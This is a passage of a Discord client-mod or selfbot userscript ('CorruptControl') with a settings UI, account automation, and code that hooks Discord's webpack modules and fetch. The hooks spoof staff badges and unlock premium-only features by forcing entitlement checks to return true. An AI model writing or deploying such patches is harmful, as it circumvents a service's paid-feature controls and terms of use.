            gradHtml += '<div class="cc-preset ' + (WatermarkCfg.gradientPreset === name ? 'active' : '') + '" data-gradient="' + name + '" style="background:' + grad + '" title="' + name + '"></div>';
        });
        gradHtml += '</div>';

        return '<div id="cc-watermark" class="cc-section active">' +
            '<div class="cc-row"><div><div class="cc-label">Show Watermark</div></div><div class="cc-toggle ' + (WatermarkCfg.enabled ? 'on' : '') + '" data-key="wm-enabled"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Hidden Mode</div><div class="cc-desc">Invisible but functional</div></div><div class="cc-toggle ' + (WatermarkCfg.hidden ? 'on' : '') + '" data-key="wm-hidden"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Use Gradient Text</div></div><div class="cc-toggle ' + (WatermarkCfg.useGradient ? 'on' : '') + '" data-key="wm-gradient"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Main Text</div></div><input class="cc-input" data-key="wm-text" value="' + WatermarkCfg.text + '"></div>' +
            '<div class="cc-row"><div><div class="cc-label">Sub Text</div><div class="cc-desc">{username}, {userid}, {server}, {time}, {date}, {version}</div></div><input class="cc-input" data-key="wm-subtext" value="' + WatermarkCfg.subtext + '"></div>' +
            '<div class="cc-row"><div><div class="cc-label">Position</div></div><select class="cc-select" data-key="wm-position">' + positions.map(p => '<option value="' + p + '" ' + (WatermarkCfg.position === p ? 'selected' : '') + '>' + p + '</option>').join('') + '</select></div>' +
            '<div class="cc-row"><div><div class="cc-label">Font Family</div></div><select class="cc-select" data-key="wm-font">' + fonts.map(f => '<option value="' + f + '" ' + (WatermarkCfg.fontFamily === f ? 'selected' : '') + '>' + f + '</option>').join('') + '</select></div>' +
            '<div class="cc-row"><div><div class="cc-label">Font Size</div></div><div style="display:flex;align-items:center;gap:8px;"><input type="range" min="8" max="24" value="' + WatermarkCfg.fontSize + '" class="cc-slider" data-key="wm-fontsize"><span style="color:#888;font-size:11px;">' + WatermarkCfg.fontSize + 'px</span></div></div>' +
            presetHtml + gradHtml +
            '<div class="cc-row"><div><div class="cc-label">Custom Color</div></div><button class="cc-color" data-key="wm-color"><input type="color" value="' + WatermarkCfg.color + '"></button></div>' +
            '<div class="cc-row"><div><div class="cc-label">Glow Intensity</div></div><div style="display:flex;align-items:center;gap:8px;"><input type="range" min="0" max="30" value="' + WatermarkCfg.glowIntensity + '" class="cc-slider" data-key="wm-glowintensity"><span style="color:#888;font-size:11px;">' + WatermarkCfg.glowIntensity + 'px</span></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Blur</div></div><div style="display:flex;align-items:center;gap:8px;"><input type="range" min="0" max="30" value="' + WatermarkCfg.blur + '" class="cc-slider" data-key="wm-blur"><span style="color:#888;font-size:11px;">' + WatermarkCfg.blur + 'px</span></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Opacity</div></div><div style="display:flex;align-items:center;gap:8px;"><input type="range" min="0.1" max="1" step="0.05" value="' + WatermarkCfg.opacity + '" class="cc-slider" data-key="wm-opacity"><span style="color:#888;font-size:11px;">' + WatermarkCfg.opacity + '</span></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Show Badges</div></div><div class="cc-toggle ' + (WatermarkCfg.showBadges ? 'on' : '') + '" data-key="wm-showbadges"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Show Clock</div></div><div class="cc-toggle ' + (WatermarkCfg.showClock ? 'on' : '') + '" data-key="wm-showclock"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Show Stats</div></div><div class="cc-toggle ' + (WatermarkCfg.showStats ? 'on' : '') + '" data-key="wm-showstats"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Animation</div></div><select class="cc-select" data-key="wm-animation">' + animations.map(a => '<option value="' + a.id + '" ' + (WatermarkCfg.animation === a.id ? 'selected' : '') + '>' + a.label + '</option>').join('') + '</select></div>' +
            '<div style="margin-top:20px;display:flex;gap:10px;justify-content:flex-end;"><button class="cc-btn secondary" id="cc-panel-close2">Close</button><button class="cc-btn" id="cc-wm-save">Apply Changes</button></div>' +
            '</div>';
    }

    function buildEffectsSection() {
        const fxTypes = ['particles', 'matrix', 'snow', 'rain', 'gradient-mesh', 'plasma', 'bokeh', 'stars', 'cyber-grid', 'static'];
        const blends = ['normal', 'overlay', 'screen', 'multiply', 'soft-light', 'hard-light'];

        return '<div id="cc-effects" class="cc-section">' +
            '<div class="cc-info-box" style="margin-bottom:14px;">\uD83C\uDFA8 <strong>Background FX Engine</strong> — Select an effect and customize its appearance. Effects run behind the Discord UI.</div>' +
            '<div class="cc-row"><div><div class="cc-label">Enable FX</div></div><div class="cc-toggle ' + (EffectsCfg.background.enabled ? 'on' : '') + '" data-key="fx-bg-enabled"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Effect Type</div></div><select class="cc-select" data-key="fx-bg-type">' + fxTypes.map(t => '<option value="' + t + '" ' + (EffectsCfg.background.type === t ? 'selected' : '') + '>' + t + '</option>').join('') + '</select></div>' +
            '<div class="cc-row"><div><div class="cc-label">Intensity</div></div><div style="display:flex;align-items:center;gap:8px;"><input type="range" min="10" max="300" value="' + EffectsCfg.background.intensity + '" class="cc-slider" data-key="fx-bg-intensity"><span style="color:#888;font-size:11px;">' + EffectsCfg.background.intensity + '</span></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Speed</div></div><div style="display:flex;align-items:center;gap:8px;"><input type="range" min="0.1" max="5" step="0.1" value="' + EffectsCfg.background.speed + '" class="cc-slider" data-key="fx-bg-speed"><span style="color:#888;font-size:11px;">' + EffectsCfg.background.speed + 'x</span></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Primary Color</div></div><button class="cc-color" data-key="fx-bg-color"><input type="color" value="' + EffectsCfg.background.color + '"></button></div>' +
            '<div class="cc-row"><div><div class="cc-label">Secondary Color</div></div><button class="cc-color" data-key="fx-bg-color2"><input type="color" value="' + EffectsCfg.background.color2 + '"></button></div>' +
            '<div class="cc-row"><div><div class="cc-label">Tertiary Color</div></div><button class="cc-color" data-key="fx-bg-color3"><input type="color" value="' + EffectsCfg.background.color3 + '"></button></div>' +
            '<div class="cc-row"><div><div class="cc-label">Opacity</div></div><div style="display:flex;align-items:center;gap:8px;"><input type="range" min="0.02" max="0.5" step="0.01" value="' + EffectsCfg.background.opacity + '" class="cc-slider" data-key="fx-bg-opacity"><span style="color:#888;font-size:11px;">' + EffectsCfg.background.opacity + '</span></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Blend Mode</div></div><select class="cc-select" data-key="fx-bg-blend">' + blends.map(b => '<option value="' + b + '" ' + (EffectsCfg.background.blendMode === b ? 'selected' : '') + '>' + b + '</option>').join('') + '</select></div>' +
            '<div style="border-top:1px solid #333;margin:16px 0;padding-top:16px"><div style="font-size:12px;font-weight:700;color:#dbdee1;margin-bottom:10px;">\uD83C\uDFA8 Watermark Animations</div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Pulse Glow</div></div><div class="cc-toggle ' + (EffectsCfg.watermark.pulse ? 'on' : '') + '" data-key="fx-wm-pulse"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Slide In</div></div><div class="cc-toggle ' + (EffectsCfg.watermark.slideIn ? 'on' : '') + '" data-key="fx-wm-slidein"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Rainbow</div></div><div class="cc-toggle ' + (EffectsCfg.watermark.rainbow ? 'on' : '') + '" data-key="fx-wm-rainbow"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Breathe</div></div><div class="cc-toggle ' + (EffectsCfg.watermark.breathe ? 'on' : '') + '" data-key="fx-wm-breathe"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Glitch</div></div><div class="cc-toggle ' + (EffectsCfg.watermark.glitch ? 'on' : '') + '" data-key="fx-wm-glitch"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Float</div></div><div class="cc-toggle ' + (EffectsCfg.watermark.float ? 'on' : '') + '" data-key="fx-wm-float"></div></div>' +
            '<div style="border-top:1px solid #333;margin:16px 0;padding-top:16px"><div style="font-size:12px;font-weight:700;color:#dbdee1;margin-bottom:10px;">\uD83D\uDD27 UI Tweaks</div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Anti-Typing</div><div class="cc-desc">Hide your typing indicator</div></div><div class="cc-toggle ' + (EffectsCfg.ui.antiTyping ? 'on' : '') + '" data-key="fx-ui-antityping"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Smooth Scroll</div></div><div class="cc-toggle ' + (EffectsCfg.ui.smoothScroll ? 'on' : '') + '" data-key="fx-ui-scroll"></div></div>' +
            '<div style="margin-top:20px;display:flex;gap:10px;justify-content:flex-end;"><button class="cc-btn" id="cc-fx-apply">Apply Effects</button></div>' +
            '</div>';
    }

    function buildBadgesSection() {
        const badgeKeys = [
            ['staff', 'Staff', '1'], ['partner', 'Partner', '2'], ['hypeSquad', 'HypeSquad Events', '4'],
            ['hypeSquadBravery', 'HypeSquad Bravery', '64'], ['hypeSquadBrilliance', 'HypeSquad Brilliance', '128'], ['hypeSquadBalance', 'HypeSquad Balance', '256'],
            ['bugHunter', 'Bug Hunter', '8'], ['bugHunterGold', 'Gold Bug Hunter', '16384'], ['earlySupporter', 'Early Supporter', '512'],
            ['earlyBotDev', 'Early Verified Bot Dev', '131072'], ['certifiedMod', 'Certified Moderator', '262144'], ['activeDev', 'Active Developer', '4194304'],
            ['nitro', 'Nitro', 'N'], ['nitroBoost', 'Nitro Boost', 'B']
        ];
        let html = '<div id="cc-badges" class="cc-section"><div class="cc-info-box" style="margin-bottom:14px;">\uD83C\uDFC5 Toggle client-side badges. These are <strong>visual only</strong> — only you see them.</div>';
        badgeKeys.forEach(([key, label]) => {
            html += '<div class="cc-row"><div><div class="cc-label">' + label + '</div></div><div class="cc-toggle ' + (BadgeCfg[key] ? 'on' : '') + '" data-key="badge-' + key + '"></div></div>';
        });
        html += '<div style="margin-top:20px;display:flex;gap:10px;justify-content:flex-end;"><button class="cc-btn" id="cc-badge-save">Apply Badges</button></div></div>';
        return html;
    }

    function buildCommandsSection() {
        const regCmds = Object.keys(REGULAR_COMMANDS).filter(k => typeof REGULAR_COMMANDS[k] === 'function').sort();
        const coCmds = Object.keys(COHOST_COMMANDS).filter(k => typeof COHOST_COMMANDS[k] === 'function' && !REGULAR_COMMANDS[k]).sort();

        return '<div id="cc-commands" class="cc-section">' +
            '<div class="cc-info-box" style="margin-bottom:14px;">\uD83D\uDCDC <strong>' + regCmds.length + '</strong> regular + <strong>' + coCmds.length + '</strong> cohost commands</div>' +
            '<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;font-size:11px;color:#949ba4;">' +
            '<div><div style="color:' + WatermarkCfg.color + ';font-weight:700;margin-bottom:8px;font-size:13px;">\uD83D\uDD34 Regular (.' + REGULAR_PREFIX + ')</div>' +
            '<div style="line-height:1.9;max-height:300px;overflow-y:auto;">' + regCmds.slice(0, 80).map(c => '<code style="background:#222;padding:2px 6px;border-radius:4px;color:#aaa;font-size:10px;">' + c + '</code>').join(' ') + '</div></div>' +
            '<div><div style="color:' + WatermarkCfg.color + ';font-weight:700;margin-bottom:8px;font-size:13px;">\uD83D\uDD51 Cohost (!' + COHOST_PREFIX + ')</div>' +
            '<div style="line-height:1.9;max-height:300px;overflow-y:auto;">' + coCmds.slice(0, 80).map(c => '<code style="background:#222;padding:2px 6px;border-radius:4px;color:#aaa;font-size:10px;">' + c + '</code>').join(' ') + '</div></div></div></div>';
    }

    function buildAdvancedSection() {
        return '<div id="cc-advanced" class="cc-section">' +
            '<div class="cc-info-box" style="margin-bottom:14px;">\u2699\uFE0F <strong>Advanced automation</strong> and system controls.</div>' +
            '<div class="cc-row"><div><div class="cc-label">Auto-Delete Commands</div><div class="cc-desc">Delete command messages after sending</div></div><div class="cc-toggle ' + (state.autoDel ? 'on' : '') + '" data-key="adv-autodel"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Hidden Mode</div><div class="cc-desc">Hide all UI elements</div></div><div class="cc-toggle ' + (state.hiddenMode ? 'on' : '') + '" data-key="adv-hidden"></div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Anti-Typing</div><div class="cc-desc">Prevent typing indicator</div></div><div class="cc-toggle ' + (state.antiTyping ? 'on' : '') + '" data-key="adv-antityping"></div></div>' +
            '<div style="border-top:1px solid #333;margin:16px 0;padding-top:16px"><div style="font-size:12px;font-weight:700;color:#dbdee1;margin-bottom:10px;">\uD83D\uDD27 Auto-Reply</div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Trigger Word</div></div><input class="cc-input" data-key="adv-trigger" placeholder="hello" style="min-width:120px"></div>' +
            '<div class="cc-row"><div><div class="cc-label">Reply Text</div></div><input class="cc-input" data-key="adv-reply" placeholder="Hey there!" style="min-width:120px"></div>' +
            '<div style="border-top:1px solid #333;margin:16px 0;padding-top:16px"><div style="font-size:12px;font-weight:700;color:#dbdee1;margin-bottom:10px;">\uD83D\uDD04 Status Rotator</div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Auto-rotate Status</div></div><div class="cc-toggle ' + (StatusCfg.enabled ? 'on' : '') + '" data-key="adv-statusrotate"></div></div>' +
            '<div style="margin-top:20px;display:flex;gap:10px;justify-content:flex-end;"><button class="cc-btn" id="cc-adv-save">Save Settings</button></div>' +
            '</div>';
    }

    function buildDataSection() {
        return '<div id="cc-data" class="cc-section">' +
            '<div class="cc-info-box" style="margin-bottom:14px;">\uD83D\uDCBE <strong>Backup & Restore</strong> — Export or import all your settings.</div>' +
            '<div class="cc-row" style="flex-direction:column;align-items:stretch;">' +
            '<div style="display:flex;gap:10px;margin-bottom:8px;">' +
            '<button class="cc-btn" id="cc-export" style="flex:1;">\uD83D\uDCE4 Export Settings</button>' +
            '<button class="cc-btn secondary" id="cc-import-btn" style="flex:1;">\uD83D\uDCE5 Import Settings</button></div>' +
            '<textarea id="cc-import-data" class="cc-input" style="min-height:80px;font-size:10px;resize:vertical;" placeholder="Paste exported JSON here..."></textarea>' +
            '</div>' +
            '<div style="border-top:1px solid #333;margin:16px 0;padding-top:16px"><div style="font-size:12px;font-weight:700;color:#dbdee1;margin-bottom:10px;">\uD83D\uDDD1\uFE0F Reset</div></div>' +
            '<div class="cc-row"><div><div class="cc-label">Reset All Settings</div><div class="cc-desc">This cannot be undone</div></div><button class="cc-btn danger" id="cc-reset-all">Reset</button></div>' +
            '</div>';
    }

    function buildAboutSection() {
        return '<div id="cc-about" class="cc-section">' +
            '<div style="text-align:center;padding:16px 0;">' +
            '<div style="width:72px;height:72px;border-radius:18px;background:' + (WatermarkCfg.useGradient ? WatermarkCfg.gradient : WatermarkCfg.color) + ';margin:0 auto 18px;display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff;font-weight:900;box-shadow:0 8px 32px ' + WatermarkCfg.glowColor + ';">' + WatermarkCfg.text.charAt(0) + '</div>' +
            '<div style="font-size:20px;font-weight:800;color:#fff;">' + SCRIPT_NAME + '</div>' +
            '<div style="font-size:12px;color:#888;margin-top:4px;">Version ' + VERSION + ' \u2014 ' + BUILD_DATE + '</div>' +
            '<div style="margin-top:16px;font-size:11px;color:#949ba4;line-height:1.9;">' +
            'The definitive Discord control system.<br>' +
            '<strong style="color:' + WatermarkCfg.color + '">' + Object.keys(REGULAR_COMMANDS).length + '</strong> regular + <strong style="color:' + WatermarkCfg.color + '">' + (Object.keys(COHOST_COMMANDS).length - Object.keys(REGULAR_COMMANDS).length) + '</strong> cohost commands<br>' +
            'VIP watermark \u2022 Background FX engine \u2022 iOS stable<br><br>' +
            '<span style="color:' + WatermarkCfg.color + '">Owner:</span> ' + (OWNER_ID ? '<@' + OWNER_ID + '>' : 'Auto-detect') + '<br>' +
            '<span style="color:' + WatermarkCfg.color + '">Cohosts:</span> ' + COHOSTS.length + '<br>' +
            '<span style="color:' + WatermarkCfg.color + '">Your ID:</span> ' + (state.userId || 'Loading...') + '<br>' +
            '<span style="color:' + WatermarkCfg.color + '">Status:</span> ' + (state.isOwner ? 'Owner' : state.isCohost ? 'Cohost' : 'User') + '<br>' +
            '<span style="color:' + WatermarkCfg.color + '">Device:</span> ' + ($.isIOS() ? 'iOS' : $.isMobile() ? 'Mobile' : 'Desktop') + '<br>' +
            '<span style="color:' + WatermarkCfg.color + '">Uptime:</span> ' + $.fmtDuration(Date.now() - state.stats.startTime) +
            '</div></div></div>';
    }

    function bindSettingsHandlers(panel) {
        panel.querySelectorAll('.cc-toggle').forEach(el => {
            el.addEventListener('click', () => el.classList.toggle('on'));
        });

        panel.querySelectorAll('input[type="range"]').forEach(el => {
            el.addEventListener('input', () => {
                const span = el.parentElement.querySelector('span');
                if (span) {
                    let suffix = '';
                    if (el.dataset.key.includes('fontsize') || el.dataset.key.includes('blur') || el.dataset.key.includes('intensity') || el.dataset.key.includes('glowintensity')) suffix = 'px';
                    else if (el.dataset.key.includes('speed')) suffix = 'x';
                    else if (el.dataset.key.includes('opacity')) suffix = '';
                    span.textContent = el.value + suffix;
                }
            });
        });

        panel.querySelectorAll('.cc-preset[data-preset]').forEach(el => {
            el.addEventListener('click', () => {
                panel.querySelectorAll('.cc-preset[data-preset]').forEach(p => p.classList.remove('active'));
                el.classList.add('active');
                WatermarkCfg.colorPreset = el.dataset.preset;
                WatermarkCfg.color = COLOR_PRESETS[el.dataset.preset];
                const colorInput = panel.querySelector('[data-key="wm-color"] input');
                if (colorInput) colorInput.value = WatermarkCfg.color;
            });
        });

        panel.querySelectorAll('.cc-preset[data-gradient]').forEach(el => {
            el.addEventListener('click', () => {
                panel.querySelectorAll('.cc-preset[data-gradient]').forEach(p => p.classList.remove('active'));
                el.classList.add('active');
                WatermarkCfg.gradientPreset = el.dataset.gradient;
                WatermarkCfg.gradient = GRADIENT_PRESETS[el.dataset.gradient];
            });
        });

        panel.querySelector('#cc-wm-save')?.addEventListener('click', () => {
            WatermarkCfg.enabled = panel.querySelector('[data-key="wm-enabled"]')?.classList.contains('on') ?? WatermarkCfg.enabled;
            WatermarkCfg.hidden = panel.querySelector('[data-key="wm-hidden"]')?.classList.contains('on') ?? WatermarkCfg.hidden;
            WatermarkCfg.useGradient = panel.querySelector('[data-key="wm-gradient"]')?.classList.contains('on') ?? WatermarkCfg.useGradient;
            WatermarkCfg.text = panel.querySelector('[data-key="wm-text"]')?.value || WatermarkCfg.text;
            WatermarkCfg.subtext = panel.querySelector('[data-key="wm-subtext"]')?.value || WatermarkCfg.subtext;
            WatermarkCfg.position = panel.querySelector('[data-key="wm-position"]')?.value || WatermarkCfg.position;
            WatermarkCfg.fontFamily = panel.querySelector('[data-key="wm-font"]')?.value || WatermarkCfg.fontFamily;
            WatermarkCfg.fontSize = parseInt(panel.querySelector('[data-key="wm-fontsize"]')?.value) || WatermarkCfg.fontSize;
            WatermarkCfg.color = panel.querySelector('[data-key="wm-color"] input')?.value || WatermarkCfg.color;
            WatermarkCfg.glowIntensity = parseInt(panel.querySelector('[data-key="wm-glowintensity"]')?.value) || WatermarkCfg.glowIntensity;
            WatermarkCfg.blur = parseInt(panel.querySelector('[data-key="wm-blur"]')?.value) || WatermarkCfg.blur;
            WatermarkCfg.opacity = parseFloat(panel.querySelector('[data-key="wm-opacity"]')?.value) || WatermarkCfg.opacity;
            WatermarkCfg.showBadges = panel.querySelector('[data-key="wm-showbadges"]')?.classList.contains('on') ?? WatermarkCfg.showBadges;
            WatermarkCfg.showClock = panel.querySelector('[data-key="wm-showclock"]')?.classList.contains('on') ?? WatermarkCfg.showClock;
            WatermarkCfg.showStats = panel.querySelector('[data-key="wm-showstats"]')?.classList.contains('on') ?? WatermarkCfg.showStats;
            WatermarkCfg.animation = panel.querySelector('[data-key="wm-animation"]')?.value || WatermarkCfg.animation;
            Settings.save('watermark', WatermarkCfg);
            updateWatermark();
            showToast('Watermark updated', 'success');
        });

        panel.querySelector('#cc-fx-apply')?.addEventListener('click', () => {
            EffectsCfg.background.enabled = panel.querySelector('[data-key="fx-bg-enabled"]')?.classList.contains('on') ?? EffectsCfg.background.enabled;
            EffectsCfg.background.type = panel.querySelector('[data-key="fx-bg-type"]')?.value || EffectsCfg.background.type;
            EffectsCfg.background.intensity = parseInt(panel.querySelector('[data-key="fx-bg-intensity"]')?.value) || EffectsCfg.background.intensity;
            EffectsCfg.background.speed = parseFloat(panel.querySelector('[data-key="fx-bg-speed"]')?.value) || EffectsCfg.background.speed;
            EffectsCfg.background.color = panel.querySelector('[data-key="fx-bg-color"] input')?.value || EffectsCfg.background.color;
            EffectsCfg.background.color2 = panel.querySelector('[data-key="fx-bg-color2"] input')?.value || EffectsCfg.background.color2;
            EffectsCfg.background.color3 = panel.querySelector('[data-key="fx-bg-color3"] input')?.value || EffectsCfg.background.color3;
            EffectsCfg.background.opacity = parseFloat(panel.querySelector('[data-key="fx-bg-opacity"]')?.value) || EffectsCfg.background.opacity;
            EffectsCfg.background.blendMode = panel.querySelector('[data-key="fx-bg-blend"]')?.value || EffectsCfg.background.blendMode;
            EffectsCfg.watermark.pulse = panel.querySelector('[data-key="fx-wm-pulse"]')?.classList.contains('on') ?? EffectsCfg.watermark.pulse;
            EffectsCfg.watermark.slideIn = panel.querySelector('[data-key="fx-wm-slidein"]')?.classList.contains('on') ?? EffectsCfg.watermark.slideIn;
            EffectsCfg.watermark.rainbow = panel.querySelector('[data-key="fx-wm-rainbow"]')?.classList.contains('on') ?? EffectsCfg.watermark.rainbow;
            EffectsCfg.watermark.breathe = panel.querySelector('[data-key="fx-wm-breathe"]')?.classList.contains('on') ?? EffectsCfg.watermark.breathe;
            EffectsCfg.watermark.glitch = panel.querySelector('[data-key="fx-wm-glitch"]')?.classList.contains('on') ?? EffectsCfg.watermark.glitch;
            EffectsCfg.watermark.float = panel.querySelector('[data-key="fx-wm-float"]')?.classList.contains('on') ?? EffectsCfg.watermark.float;
            EffectsCfg.ui.antiTyping = panel.querySelector('[data-key="fx-ui-antityping"]')?.classList.contains('on') ?? EffectsCfg.ui.antiTyping;
            EffectsCfg.ui.smoothScroll = panel.querySelector('[data-key="fx-ui-scroll"]')?.classList.contains('on') ?? EffectsCfg.ui.smoothScroll;
            Settings.save('effects', EffectsCfg);
            if (window.__cc_fx_cleanup) window.__cc_fx_cleanup();
            createEffectsContainer(); injectFonts(); updateWatermark();
            showToast('Effects applied', 'success');
        });

        panel.querySelector('#cc-badge-save')?.addEventListener('click', () => {
            ['staff', 'partner', 'hypeSquad', 'hypeSquadBravery', 'hypeSquadBrilliance', 'hypeSquadBalance', 'bugHunter', 'bugHunterGold', 'earlySupporter', 'earlyBotDev', 'certifiedMod', 'activeDev', 'nitro', 'nitroBoost'].forEach(key => {
                BadgeCfg[key] = panel.querySelector('[data-key="badge-' + key + '"]')?.classList.contains('on') ?? BadgeCfg[key];
            });
            Settings.save('badges', BadgeCfg);
            injectBadges(); updateWatermark();
            showToast('Badges updated', 'success');
        });

        panel.querySelector('#cc-adv-save')?.addEventListener('click', () => {
            state.autoDel = panel.querySelector('[data-key="adv-autodel"]')?.classList.contains('on') ?? state.autoDel;
            state.hiddenMode = panel.querySelector('[data-key="adv-hidden"]')?.classList.contains('on') ?? state.hiddenMode;
            state.antiTyping = panel.querySelector('[data-key="adv-antityping"]')?.classList.contains('on') ?? state.antiTyping;
            StatusCfg.enabled = panel.querySelector('[data-key="adv-statusrotate"]')?.classList.contains('on') ?? StatusCfg.enabled;

            const trigger = panel.querySelector('[data-key="adv-trigger"]')?.value;
            const reply = panel.querySelector('[data-key="adv-reply"]')?.value;
            if (trigger && reply) { state.autoReplies[trigger.toLowerCase()] = reply; Settings.save('autoReplies', state.autoReplies); }

            Settings.save('statusRotator', StatusCfg);
            if (StatusCfg.enabled) startStatusRotator(); else stopStatusRotator();
            showToast('Advanced settings saved', 'success');
        });

        panel.querySelector('#cc-export')?.addEventListener('click', () => {
            const data = Settings.export();
            $.copyText(data);
            showToast('Settings copied to clipboard!', 'success');
        });

        panel.querySelector('#cc-import-btn')?.addEventListener('click', () => {
            const data = panel.querySelector('#cc-import-data')?.value;
            if (!data) { showToast('Paste data first', 'warning'); return; }
            if (Settings.import(data)) { showToast('Settings imported! Reloading...', 'success'); setTimeout(() => location.reload(), 1500); }
            else { showToast('Invalid data', 'error'); }
        });

        panel.querySelector('#cc-reset-all')?.addEventListener('click', () => {
            if (!confirm('Reset ALL CorruptControl settings to default? This cannot be undone.')) return;
            Settings.reset(); location.reload();
        });

        panel.querySelector('#cc-panel-close')?.addEventListener('click', () => panel.remove());
        panel.querySelector('#cc-panel-close2')?.addEventListener('click', () => panel.remove());
    }


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 13: BADGE & NITRO SPOOFING ENGINE
       ═══════════════════════════════════════════════════════════════════════ */

    function calcFlags() {
        let f = 0;
        if (BadgeCfg.staff) f |= 1;
        if (BadgeCfg.partner) f |= 2;
        if (BadgeCfg.hypeSquad) f |= 4;
        if (BadgeCfg.bugHunter) f |= 8;
        if (BadgeCfg.hypeSquadBravery) f |= 64;
        if (BadgeCfg.hypeSquadBrilliance) f |= 128;
        if (BadgeCfg.hypeSquadBalance) f |= 256;
        if (BadgeCfg.earlySupporter) f |= 512;
        if (BadgeCfg.bugHunterGold) f |= 16384;
        if (BadgeCfg.earlyBotDev) f |= 131072;
        if (BadgeCfg.certifiedMod) f |= 262144;
        if (BadgeCfg.activeDev) f |= 4194304;
        return f;
    }

    function getBadgeList() {
        const b = [];
        if (BadgeCfg.staff) b.push('Staff');
        if (BadgeCfg.partner) b.push('Partner');
        if (BadgeCfg.hypeSquad) b.push('HypeSquad');
        if (BadgeCfg.hypeSquadBravery) b.push('Bravery');
        if (BadgeCfg.hypeSquadBrilliance) b.push('Brilliance');
        if (BadgeCfg.hypeSquadBalance) b.push('Balance');
        if (BadgeCfg.bugHunter) b.push('BugHunter');
        if (BadgeCfg.bugHunterGold) b.push('BugHunterGold');
        if (BadgeCfg.earlySupporter) b.push('EarlySupporter');
        if (BadgeCfg.earlyBotDev) b.push('EarlyBotDev');
        if (BadgeCfg.certifiedMod) b.push('CertifiedMod');
        if (BadgeCfg.activeDev) b.push('ActiveDev');
        if (BadgeCfg.nitro) b.push('Nitro');
        if (BadgeCfg.nitroBoost) b.push('NitroBoost');
        return b;
    }

    function injectBadges() {
        try {
            const flags = calcFlags();
            const w = window.webpackChunkdiscord_app;
            if (!w) return;
            const m = [];
            w.push([[''], {}, e => { for (const c in e.c) m.push(e.c[c]); }]); w.pop();

            const userStore = m.find(x => x?.exports?.default?.getCurrentUser);
            if (userStore?.exports?.default) {
                const orig = userStore.exports.default.getCurrentUser;
                userStore.exports.default.getCurrentUser = function () {
                    const user = orig.call(this);
                    if (user) {
                        user.public_flags = flags;
                        user.flags = flags;
                        if (BadgeCfg.nitro || BadgeCfg.nitroBoost) { user.premium_type = 2; user.premium = true; }
                    }
                    return user;
                };
            }

            const _fetch = window.fetch;
            window.fetch = async function (...args) {
                const res = await _fetch.apply(this, args);
                const url = (args[0] || '').toString();
                if (url.includes('/users/') && !url.includes('/channels/')) {
                    try {
                        const clone = res.clone();
                        const data = await clone.json();
                        const myId = getUserId();
                        if (data?.id === myId) {
                            data.public_flags = flags;
                            data.flags = flags;
                            if (BadgeCfg.nitro || BadgeCfg.nitroBoost) { data.premium_type = 2; data.premium = true; }
                            return new Response(JSON.stringify(data), { status: res.status, statusText: res.statusText, headers: res.headers });
                        }
                    } catch { }
                }
                return res;
            };
            console.log('[CC-Elite] Badge spoof active:', getBadgeList().join(', '));
        } catch (e) { console.error('[CC-Elite] Badge injection failed:', e); }
    }

    function enableNitroFeatures() {
        if (!NitroCfg.enabled) return;
        try {
            const w = window.webpackChunkdiscord_app;
            if (w) {
                const m = [];
                w.push([[''], {}, e => { for (const c in e.c) m.push(e.c[c]); }]); w.pop();

                const emojiMod = m.find(x => x?.exports?.default?.canUseAnimatedEmojis !== undefined);
                if (emojiMod?.exports?.default) {
                    emojiMod.exports.default.canUseAnimatedEmojis = () => true;
                    emojiMod.exports.default.canUseEmojisEverywhere = () => true;
                }
                const themeMod = m.find(x => x?.exports?.default?.canUseClientThemes !== undefined);
                if (themeMod?.exports?.default) themeMod.exports.default.canUseClientThemes = () => true;
                const profileMod = m.find(x => x?.exports?.default?.canUsePremiumProfileCustomization !== undefined);
                if (profileMod?.exports?.default) profileMod.exports.default.canUsePremiumProfileCustomization = () => true;
                const reactionMod = m.find(x => x?.exports?.default?.canUseSuperReactions !== undefined);
                if (reactionMod?.exports?.default) reactionMod.exports.default.canUseSuperReactions = () => true;
            }
            if (NitroCfg.largerUploads) {
                try { Object.defineProperty(navigator, 'connection', { get: () => ({ effectiveType: '4g', downlink: 100 }) }); }
                catch { }
            }
            console.log('[CC-Elite] Nitro spoof active');
        } catch (e) { console.error('[CC-Elite] Nitro injection failed:', e); }
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 14: STATUS ROTATOR
       ═══════════════════════════════════════════════════════════════════════ */

    function startStatusRotator() {
        if (!StatusCfg.enabled) return;
        let idx = 0;
        if (state.statusInterval) clearInterval(state.statusInterval);
        state.statusInterval = setInterval(() => {
            const s = StatusCfg.messages[idx % StatusCfg.messages.length];
            apiRequest('/users/@me/settings', {
                method: 'PATCH',
                body: JSON.stringify({ status: 'online', custom_status: { text: s.text, emoji_name: s.emoji } })
            }).catch(() => { });
            idx++;
        }, StatusCfg.interval);
    }

    function stopStatusRotator() {
        if (state.statusInterval) { clearInterval(state.statusInterval); state.statusInterval = null; }
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 15: ANTI-TYPING INDICATOR
       ═══════════════════════════════════════════════════════════════════════ */

    function initAntiTyping() {
        if (!EffectsCfg.ui.antiTyping) return;
        try {
